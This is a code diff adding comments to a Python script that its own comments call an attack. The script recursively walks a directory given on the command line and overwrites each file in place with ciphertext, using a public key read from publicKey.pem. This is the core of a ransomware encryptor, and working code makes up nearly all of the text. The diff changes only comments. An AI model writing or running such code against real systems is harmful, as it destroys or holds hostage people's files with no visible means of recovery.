@@ -13,7 +13,7 @@ from Crypto.Cipher import PKCS1_OAEP #for creating a cipher
 # start the attack by asking a user for a directory to encrypt
 # we will use the command line arguments to get the directory to encrypt
 
-
+#encrypting file
 def encrypt_file(file_path, public_key):
     with open(file_path, 'rb') as original_file:
         original_content = original_file.read()
@@ -25,7 +25,7 @@ def encrypt_file(file_path, public_key):
     with open(file_path, 'wb') as encrypted_file:
         encrypted_file.write(encrypted_content)
 
-
+#scanning directories recursively and encrypting each file
 def encrypt_directory(directory, public_key):
     for root, dirs, files in os.walk(directory):
         print(f"Scanning directory: {root}")
@@ -44,6 +44,7 @@ def encrypt_directory(directory, public_key):
 #We use the directory passed from the command
 directory = sys.argv[1]
 
+#opening the public key file
 with open('publicKey.pem', 'rb') as pub:
     key = pub.read()
 
@@ -59,6 +60,7 @@ if not os.path.exists(directory):
      sys.exit(1)
 
 
+#encrypting the directory
 encrypt_directory(directory,key)
 
 
